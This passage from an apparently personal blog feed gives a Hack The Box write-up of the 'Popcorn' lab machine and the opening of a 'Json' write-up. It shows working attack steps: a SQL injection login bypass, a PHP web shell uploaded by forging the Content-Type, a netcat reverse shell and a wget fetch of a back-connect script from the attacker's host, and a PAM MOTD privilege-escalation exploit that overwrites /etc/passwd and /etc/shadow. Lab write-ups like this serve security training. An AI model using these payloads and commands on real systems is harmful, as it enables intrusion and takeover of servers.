</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">44
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">45
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">46
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">47
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">48
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">49
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">50
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nmap -p22,80 --script<span style="color:#ff79c6">=</span>vuln nmap/vuln 10.10.10.6

Starting Nmap 7.60 <span style="color:#ff79c6">(</span> https://nmap.org <span style="color:#ff79c6">)</span> at 2020-02-21 14:37 UTC
Unable to split netmask from target expression: <span style="color:#f1fa8c">&#34;nmap/vuln&#34;</span>
Stats: 0:00:59 elapsed; <span style="color:#bd93f9">0</span> hosts completed <span style="color:#ff79c6">(</span><span style="color:#bd93f9">1</span> up<span style="color:#ff79c6">)</span>, <span style="color:#bd93f9">1</span> undergoing Script Scan
NSE Timing: About 97.94% <span style="color:#ff79c6">done</span>; ETC: 14:38 <span style="color:#ff79c6">(</span>0:00:01 remaining<span style="color:#ff79c6">)</span>
Nmap scan report <span style="color:#ff79c6">for</span> 10.10.10.6
Host is up <span style="color:#ff79c6">(</span>0.27s latency<span style="color:#ff79c6">)</span>.

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
|_http-csrf: Couldn<span style="color:#f1fa8c">&#39;t find any CSRF vulnerabilities.
</span><span style="color:#f1fa8c">|_http-dombased-xss: Couldn&#39;</span>t find any DOM based XSS.
| http-enum:
|   /test/: Test page
|   /test.php: Test page
|   /test/logon.html: Jetty
|_  /icons/: Potentially interesting folder w/ directory listing
| http-slowloris-check:
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server<span style="color:#f1fa8c">&#39;s resources causing Denial Of Service.
</span><span style="color:#f1fa8c">|
</span><span style="color:#f1fa8c">|     Disclosure date: 2009-09-17
</span><span style="color:#f1fa8c">|     References:
</span><span style="color:#f1fa8c">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
</span><span style="color:#f1fa8c">|_      http://ha.ckers.org/slowloris/
</span><span style="color:#f1fa8c">|_http-stored-xss: Couldn&#39;</span>t find any stored XSS vulnerabilities.
| http-vuln-cve2011-3192:
|   VULNERABLE:
|   Apache byterange filter DoS
|     State: VULNERABLE
|     IDs:  OSVDB:74721  CVE:CVE-2011-3192
|       The Apache web server is vulnerable to a denial of service attack when numerous
|       overlapping byte ranges are requested.
|     Disclosure date: 2011-08-19
|     References:
|       http://nessus.org/plugins/index.php?view<span style="color:#ff79c6">=</span>single&amp;<span style="color:#8be9fd;font-style:italic">id</span><span style="color:#ff79c6">=</span><span style="color:#bd93f9">55976</span>
|       http://cve.mitre.org/cgi-bin/cvename.cgi?name<span style="color:#ff79c6">=</span>CVE-2011-3192
|       http://osvdb.org/74721
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name<span style="color:#ff79c6">=</span>CVE-2011-3192
|_      http://seclists.org/fulldisclosure/2011/Aug/175

Nmap <span style="color:#ff79c6">done</span>: <span style="color:#bd93f9">1</span> IP address <span style="color:#ff79c6">(</span><span style="color:#bd93f9">1</span> host up<span style="color:#ff79c6">)</span> scanned in 334.14 seconds
</code></pre></td></tr></table>
</div>
</div><h2 id="gobuster">Gobuster</h2>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">/opt/gobuster/gobuster dir -u http://10.10.10.6/ -w /opt/dictionaries/directory-list-2.3-medium.txt
<span style="color:#ff79c6">===============================================================</span>
Gobuster v3.0.1
by OJ Reeves <span style="color:#ff79c6">(</span>@TheColonial<span style="color:#ff79c6">)</span> &amp; Christian Mehlmauer <span style="color:#ff79c6">(</span>@_FireFart_<span style="color:#ff79c6">)</span>
<span style="color:#ff79c6">===============================================================</span>
<span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Url:            http://10.10.10.6/
<span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Threads:        <span style="color:#bd93f9">10</span>
<span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Wordlist:       /opt/dictionaries/directory-list-2.3-medium.txt
<span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Status codes:   200,204,301,302,307,401,403
<span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> User Agent:     gobuster/3.0.1
<span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Timeout:        <span style="color:#8be9fd;font-style:italic">10s</span>
<span style="color:#ff79c6">===============================================================</span>
2020/02/21 14:39:31 Starting <span style="color:#8be9fd;font-style:italic">gobuster</span>
<span style="color:#ff79c6">===============================================================</span>
/index <span style="color:#ff79c6">(</span>Status: 200<span style="color:#ff79c6">)</span>
/test <span style="color:#ff79c6">(</span>Status: 200<span style="color:#ff79c6">)</span>
/torrent <span style="color:#ff79c6">(</span>Status: 301<span style="color:#ff79c6">)</span>
/rename <span style="color:#ff79c6">(</span>Status: 301<span style="color:#ff79c6">)</span>
</code></pre></td></tr></table>
</div>
</div><h2 id="web-exploration">Web exploration</h2>
<table>
<thead>
<tr>
<th>url</th>
<th>notes</th>
</tr>
</thead>
<tbody>
<tr>
<td>http://10.10.10.6/test</td>
<td>Response is the config.php response</td>
</tr>
<tr>
<td>http://10.10.10.6/rename/</td>
<td>Response is <code>Renamer API Syntax: index.php?filename=old_file_path_an_name&amp;newfilename=new_file_path_and_name</code></td>
</tr>
<tr>
<td>http://10.10.10.6/torrent/login.php</td>
<td>SQLI injection / Torrent Hoster</td>
</tr>
</tbody>
</table>
<h2 id="sql-injection-to-login-the-website">SQL Injection to login the website</h2>
<pre><code>SELECT userName, password, privilege, email
FROM users
WHERE userName = ''' AND password = '098f6bcd4621d373cade4e832627b4f6'
</code></pre>
<p>We are successful to login with</p>
<ul>
<li>username:' OR 1=1 #</li>
<li>password:a</li>
</ul>
<h2 id="exploit-torrent-hoster-upload-vulnerability">Exploit Torrent Hoster Upload vulnerability</h2>
<pre><code>searchsploit hoster
[..]
| Torrent Hoster - Remount Upload | exploits/php/webapps/11746.txt |
</code></pre>
<p>As per <code>searchploit -p 11746</code>, we have access to the upload page:</p>
<blockquote>
<p>http://10.10.10.6/torrent/torrents.php?mode=upload</p>
</blockquote>
<p>After intercepting requests in Burp-Suite, we can now attempt to upload a php shell.</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">cat system<span style="color:#ff79c6">.</span>png<span style="color:#ff79c6">.</span>php
<span style="color:#ff79c6">&lt;?</span>php <span style="color:#ff79c6">echo</span> system(<span style="color:#8be9fd;font-style:italic">$_GET</span>[<span style="color:#f1fa8c">&#39;cmd&#39;</span>]); <span style="color:#ff79c6">?&gt;</span>
</code></pre></td></tr></table>
</div>
</div><p>The request is rejected because of invalid file, we send the request back to repeater, and we change the header</p>
<table>
<thead>
<tr>
<th>from</th>
<th>to</th>
</tr>
</thead>
<tbody>
<tr>
<td>Content-Type: text/php</td>
<td>Content-Type: image/png</td>
</tr>
</tbody>
</table>
<p>The file is successfully uploaded, we can now have a look on the <code>upload</code></p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">Index of /torrent/upload
<span style="color:#ff79c6">[</span>ICO<span style="color:#ff79c6">]</span>   Name    Last modified   Size    Description
<span style="color:#ff79c6">[</span>DIR<span style="color:#ff79c6">]</span>   Parent Directory        -
<span style="color:#ff79c6">[</span> <span style="color:#ff79c6">]</span>     82a89eb750df691500411022c897009d3928ab36.php    21-Feb-2020 17:40   <span style="color:#bd93f9">36</span>
<span style="color:#ff79c6">[</span>IMG<span style="color:#ff79c6">]</span>   723bc28f9b6f924cca68ccdff96b6190566ca6b4.png    17-Mar-2017 23:06   58K
<span style="color:#ff79c6">[</span>IMG<span style="color:#ff79c6">]</span>   noss.png                                        02-Jun-2007 23:15   32K
Apache/2.2.12 <span style="color:#ff79c6">(</span>Ubuntu<span style="color:#ff79c6">)</span> Server at 10.10.10.6 Port <span style="color:#bd93f9">80</span> <span style="color:#ff79c6">]</span>
</code></pre></td></tr></table>
</div>
</div><p>Our php file is accessible and we can pass it a command</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">http://10.10.10.6/torrent/upload/82a89eb750df691500411022c897009d3928ab36.php?cmd<span style="color:#ff79c6">=</span>whoami
www-data www-data
</code></pre></td></tr></table>
</div>
</div><p>Let&rsquo;s spawn a shell on port 8000 with netcat. We can check presence of bash and netcat by using:</p>
<ul>
<li><code>cmd=whereis nc</code> and</li>
<li><code>cmd=whereis bash</code></li>
</ul>
<p>We can get a reverse shell:</p>
<pre><code>http://10.10.10.6/torrent/upload/82a89eb750df691500411022c897009d3928ab36.php?cmd=nc -e /bin/bash 10.10.14.36 8000
</code></pre>
<p>To fix our shell, we need some info from our attacking machine:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">stty -a
speed <span style="color:#bd93f9">38400</span> baud; rows 44; columns 158; <span style="color:#8be9fd;font-style:italic">line</span> <span style="color:#ff79c6">=</span> 0;
<span style="color:#8be9fd;font-style:italic">echo</span> <span style="color:#8be9fd;font-style:italic">$TERM</span>
screen-256color
</code></pre></td></tr></table>
</div>
</div><p>We can now fix our remote shell</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">_  ~ rlwrap nc -lnvp <span style="color:#bd93f9">8000</span>
listening on <span style="color:#ff79c6">[</span>any<span style="color:#ff79c6">]</span> <span style="color:#bd93f9">8000</span> ...
connect to <span style="color:#ff79c6">[</span>172.17.0.2<span style="color:#ff79c6">]</span> from <span style="color:#ff79c6">(</span>UNKNOWN<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">[</span>192.168.99.1<span style="color:#ff79c6">]</span> <span style="color:#bd93f9">53527</span>
python -c <span style="color:#f1fa8c">&#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
www-data@popcorn:/var/www/torrent/upload$
<span style="color:#ff79c6">[</span>1<span style="color:#ff79c6">]</span>  + <span style="color:#bd93f9">24481</span> suspended  rlwrap nc -lnvp <span style="color:#bd93f9">8000</span>
_  ~ stty raw -echo
_  ~ <span style="color:#8be9fd;font-style:italic">fg</span>
<span style="color:#ff79c6">[</span>1<span style="color:#ff79c6">]</span>  + <span style="color:#bd93f9">24481</span> continued  rlwrap nc -lnvp <span style="color:#bd93f9">8000</span>
www-data@popcorn:/var/www/torrent/upload$ <span style="color:#8be9fd;font-style:italic">export</span> <span style="color:#8be9fd;font-style:italic">SHELL</span><span style="color:#ff79c6">=</span>bash
<span style="color:#8be9fd;font-style:italic">export</span> <span style="color:#8be9fd;font-style:italic">SHELL</span><span style="color:#ff79c6">=</span>bash
www-data@popcorn:/var/www/torrent/upload$ <span style="color:#8be9fd;font-style:italic">export</span> <span style="color:#8be9fd;font-style:italic">TERM</span><span style="color:#ff79c6">=</span>screen-256color
<span style="color:#8be9fd;font-style:italic">export</span> <span style="color:#8be9fd;font-style:italic">TERM</span><span style="color:#ff79c6">=</span>screen-256color
www-data@popcorn:/var/www/torrent/upload$ reset
reset
</code></pre></td></tr></table>
</div>
</div><div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">python3 -m http.server <span style="color:#bd93f9">8080</span>
Serving HTTP on 0.0.0.0 port <span style="color:#bd93f9">8080</span> <span style="color:#ff79c6">(</span>http://0.0.0.0:8080/<span style="color:#ff79c6">)</span> ...
</code></pre></td></tr></table>
</div>
</div><p>Got the user flag and found motd file, the server may be vulnerable to motd tamper attack on PAM</p>
<h1 id="exploit-motd">Exploit motd</h1>
<p>Fix 14339.sh <code>\r</code> caracter:</p>
<blockquote>
<p>dos2unix 14339.sh</p>
</blockquote>
<p>Modify the exploit:</p>
<pre><code>:%s/\~/\/home\/george/g
</code></pre>
<p>Upload a tcp reverse from <a href="https://github.com/infodox/python-pty-shells.git">https://github.com/infodox/python-pty-shells.git</a></p>
<pre><code>cmd=wget 10.10.14.36:8080/tcp_pty_backconnect.py -O /dev/shm/.r.py
</code></pre>
<p>Execute the reverse shell:</p>
<pre><code>cmd=python /dev/shm/.r.py`
</code></pre>
<p>We obtain a reverse shell:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">python tcp_pty_shell_handler.py -b 0.0.0.0:8001
www-data@popcorn:/var/www/torrent/upload$
</code></pre></td></tr></table>
</div>
</div><p>File enumeration</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">find /home -printf <span style="color:#f1fa8c">&#34;%f\t%p\t%u\t%g\t%m&#34;</span> 2&gt;/dev/null
find /home -printf <span style="color:#f1fa8c">&#34;%f\t%p\t%u\t%g\t%m&#34;</span> | column -t
</code></pre></td></tr></table>
</div>
</div><pre><code>home                        /home                                       root    root    755
george                      /home/george                                george  george  755
.bash_logout                /home/george/.bash_logout                   george  george  644
.bashrc                     /home/george/.bashrc                        george  george  644
torrenthoster.zip           /home/george/torrenthoster.zip              george  george  644
.cache                      /home/george/.cache                         george  george  755
motd.legal-displayed        /home/george/.cache/motd.legal-displayed    george  george  644
.sudo_as_admin_successful   /home/george/.sudo_as_admin_successful      george  george  644
user.txt                    /home/george/user.txt                       george  george  644
.nano_history               /home/george/.nano_history                  root    root    600
.mysql_history              /home/george/.mysql_history                 root    root    600
.bash_history               /home/george/.bash_history                  root    root    600
.profile                    /home/george/.profile                       george  george  644
</code></pre>
<p>Upload Exploit:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">     wget 10.10.14.36:8080/14339.sh
</code></pre></td></tr></table>
</div>
</div><pre><code>--2020-02-21 21:54:11-- http://10.10.14.36:8080/14339.sh
Connecting to 10.10.14.36:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3043 (3.0K) [text/x-sh]
100%[======================================&gt;] 3,043 --.-K/s in 0.001s

2020-02-21 21:54:12 (5.67 MB/s) - `14339.sh' saved [3043/3043]
</code></pre>
<p>Execute the exploit:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">www-data@popcorn:/var/www/torrent/upload$ bash 14339.sh
<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> Ubuntu PAM MOTD <span style="color:#8be9fd;font-style:italic">local</span> root
<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> SSH key <span style="color:#8be9fd;font-style:italic">set</span> up
<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> spawn ssh
<span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> owned: /etc/passwd
<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> spawn ssh
<span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> owned: /etc/shadow
<span style="color:#ff79c6">[</span>*<span style="color:#ff79c6">]</span> SSH key removed
<span style="color:#ff79c6">[</span>+<span style="color:#ff79c6">]</span> Success! Use password toor to get root
Password:
root@popcorn:/var/www/torrent/upload# cat /root/root.txt
</code></pre></td></tr></table>
</div>
</div>]]></content></item><item><title>HTB - Json</title><link>https://0xade1.github.io/posts/2020/03/htb-json/</link><pubDate>Thu, 05 Mar 2020 00:54:12 +0800</pubDate><guid>https://0xade1.github.io/posts/2020/03/htb-json/</guid><description>RECKON 220-FileZilla Server 0.9.60 beta Microsoft IIS httpd 8.5 =&amp;gt; Windows Server 2012 hostname = JSON message_signing: disabled (dangerous, but default) or not required Website with multiple Dead links: javascripts, images &amp;hellip; 1 2 smbclient -L \\10.10.10.158 -n session setup failed: NT_STATUS_ACCESS_DENIED Connecting Burp-Suite, We can intercept the Login HTTP request, click Action: Send to repeater
1 2 3 4 5 6 7 8 9 10 11 12 13 POST /api/token HTTP/1.</description><content type="html"><![CDATA[<h1 id="reckon">RECKON</h1>
<ul>
<li>220-FileZilla Server 0.9.60 beta</li>
<li>Microsoft IIS httpd 8.5 =&gt; Windows Server 2012</li>
<li>hostname = JSON</li>
<li>message_signing: disabled (dangerous, but default) or not required</li>
<li>Website with multiple Dead links: javascripts, images &hellip;</li>
</ul>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">smbclient -L <span style="color:#f1fa8c">\\</span>10.10.10.158 -n
session setup failed: NT_STATUS_ACCESS_DENIED
